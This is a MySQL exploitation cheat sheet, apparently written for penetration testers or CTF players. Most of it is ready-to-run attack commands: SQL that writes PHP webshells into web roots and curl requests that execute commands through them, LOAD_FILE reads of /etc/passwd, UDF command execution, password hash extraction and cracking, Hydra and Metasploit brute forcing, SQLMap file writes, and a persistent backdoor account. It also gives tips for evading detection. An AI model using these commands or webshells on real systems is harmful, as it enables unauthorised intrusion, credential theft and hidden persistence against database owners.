# MySQL Enumeration

Enumerate and exploit MySQL database servers to read files, write webshells, and extract sensitive data including credentials.
MySQL often runs with elevated privileges and can be leveraged for command execution and privilege escalation.

## Port Scanning
```bash
# Scan MySQL port
sudo nmap -p 3306 -sV -sC --script mysql* 10.10.10.10
```

## Authentication
```bash
# Connect to MySQL
mysql -u root -h 10.10.10.10 -p

# Connect with password (no space after -p)
mysql -u root -p'password' -h 10.10.10.10

# Connect to specific database
mysql -u root -p'password' -h 10.10.10.10 -D database_name
```

## Database Enumeration

### List Databases
```sql
-- Show all databases
SHOW DATABASES;

-- MySQL default databases:
-- mysql: system database with server information
-- information_schema: database metadata
-- performance_schema: server execution monitoring
-- sys: performance schema helper objects
```

### Select Database
```sql
USE database_name;
```

### List Tables
```sql
-- Show tables in current database
SHOW TABLES;

-- Show tables in specific database
SHOW TABLES FROM database_name;
```

### List Columns
```sql
-- Show columns in table
SHOW COLUMNS FROM table_name;

-- Alternative
DESCRIBE table_name;
```

### Query Data
```sql
-- Select all from table
SELECT * FROM table_name;

-- Select specific columns
SELECT username,password FROM users;

-- Filter results
SELECT * FROM users WHERE username = 'admin';
```

## File Operations

### Check File Privileges
```sql
-- Check secure_file_priv setting
SHOW VARIABLES LIKE "secure_file_priv";

-- Empty value: no restrictions (insecure)
-- Directory path: restricted to that directory
-- NULL: file operations disabled

-- Check local_infile setting
SHOW VARIABLES LIKE 'local_infile';
```

### Read Files
```sql
-- Read file (requires FILE privilege)
SELECT LOAD_FILE("/etc/passwd");

-- Read file into table
LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_table;
```

### Write Files
```sql
-- Write query output to file
SELECT "test content" INTO OUTFILE '/tmp/test.txt';

-- Write webshell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';

-- Write with specific format
SELECT * FROM users INTO OUTFILE '/tmp/users.txt'
FIELDS TERMINATED BY ','
ENCLOSED BY '"'
LINES TERMINATED BY '\n';
```

## Command Execution via Webshell

### Write PHP Webshell
```sql
-- Simple webshell
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

-- More advanced webshell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

### Access Webshell
```bash
# Execute commands via webshell
curl http://10.10.10.10/shell.php?cmd=whoami
curl http://10.10.10.10/webshell.php?c=id
```

## User Defined Functions (UDF)

### Check for UDF
```sql
-- List functions
SELECT * FROM mysql.func;
```

### Create UDF for Command Execution
```sql
-- Create function (requires lib_mysqludf_sys)
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';

-- Execute command
SELECT sys_exec('whoami');
```

## User Enumeration

### List Users
```sql
-- Show all MySQL users
SELECT user,host FROM mysql.user;

-- Show current user
SELECT USER();
SELECT CURRENT_USER();

-- Show user privileges
SHOW GRANTS;
SHOW GRANTS FOR 'user'@'host';
```

### Check Privileges
```sql
-- Check specific privilege
SELECT user,file_priv FROM mysql.user WHERE user='root';

-- Check all privileges
SELECT * FROM mysql.user WHERE user='root'\G
```

## Password Extraction

### Extract Password Hashes
```sql
-- MySQL 5.7 and earlier
SELECT user,password FROM mysql.user;

-- MySQL 8.0+
SELECT user,authentication_string FROM mysql.user;
```

### Crack MySQL Hashes
```bash
# Identify hash type
# MySQL old: *hash (SHA1)
# MySQL new: $A$005$hash (caching_sha2_password)

# Crack with John
john --format=mysql-sha1 hashes.txt --wordlist=rockyou.txt

# Crack with Hashcat
hashcat -m 300 hashes.txt rockyou.txt  # MySQL old
hashcat -m 7401 hashes.txt rockyou.txt # MySQL new
```

## Brute Force

### Hydra
```bash
hydra -l root -P passwords.txt 10.10.10.10 mysql
```

### Metasploit
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 10.10.10.10
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

## SQLMap Integration

### Write File via SQLMap
```bash
# Write webshell
sqlmap -u "http://10.10.10.10/page.php?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php

# Read file
sqlmap -u "http://10.10.10.10/page.php?id=1" --file-read=/etc/passwd
```

## Configuration Files

### Common MySQL Config Locations
```bash
# Linux
/etc/mysql/my.cnf
/etc/my.cnf
~/.my.cnf

# Windows
C:\ProgramData\MySQL\MySQL Server 8.0\my.ini
C:\Program Files\MySQL\MySQL Server 8.0\my.ini
```

### Extract Credentials from Config
```bash
# Search for credentials
grep -i "password" /etc/mysql/my.cnf
grep -i "user" /etc/mysql/my.cnf
```

## Dangerous Settings

### Insecure Configurations
```ini
# No secure_file_priv restriction
secure_file_priv = ""

# Local infile enabled
local_infile = 1

# Weak authentication
skip-grant-tables

# Remote root access
bind-address = 0.0.0.0
```

## Post-Exploitation

### Persistence
```sql
-- Create backdoor user
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

### Data Exfiltration
```sql
-- Dump entire database
SELECT * FROM information_schema.tables;

-- Export to file
SELECT * FROM sensitive_table INTO OUTFILE '/tmp/data.csv'
FIELDS TERMINATED BY ','
ENCLOSED BY '"'
LINES TERMINATED BY '\n';
```

## Notes

**Default Port:**
- 3306: MySQL default port
- 33060: MySQL X Protocol (newer versions)

**Default Credentials:**
- Username: root
- Password: Often blank or weak on default installations
- Always try root with no password first

**File Privilege Requirements:**
- FILE privilege required for LOAD_FILE() and INTO OUTFILE
- secure_file_priv must allow file operations
- File system permissions must allow read/write

**Secure File Priv:**
- Empty: No restrictions (insecure, allows any file operations)
- Directory path: Restricted to specific directory
- NULL: File operations completely disabled
- Check with: SHOW VARIABLES LIKE "secure_file_priv";

**Webshell Requirements:**
- Web server must be running (Apache, Nginx, IIS)
- Must know web root directory (/var/www/html, C:\inetpub\wwwroot)
- MySQL user must have FILE privilege
- File system permissions must allow write to web directory

**Common Web Roots:**
- Linux: /var/www/html, /var/www, /usr/share/nginx/html
- Windows: C:\inetpub\wwwroot, C:\xampp\htdocs

**User Defined Functions:**
- Requires lib_mysqludf_sys library
- Not common in production environments
- Can provide direct command execution
- Requires SUPER privilege to create

**Password Hashes:**
- MySQL 5.7 and earlier: SHA1 hash (40 chars, starts with *)
- MySQL 8.0+: caching_sha2_password (longer, starts with $A$)
- Old hashes easier to crack than new ones

**Privilege Escalation:**
- MySQL often runs as mysql user (low privilege)
- Can escalate via UDF if mysql user can write to plugin directory
- Webshell provides www-data or apache user access
- Look for sudo misconfigurations or SUID binaries

**Detection Evasion:**
- Avoid obvious webshell names (shell.php, cmd.php)
- Use legitimate-looking filenames
- Clean up webshells after use
- Limit file operations to avoid triggering alerts

**Common Misconfigurations:**
- Root accessible from any host (%)
- No password for root account
- FILE privilege granted to non-admin users
- secure_file_priv disabled
- Weak or default passwords
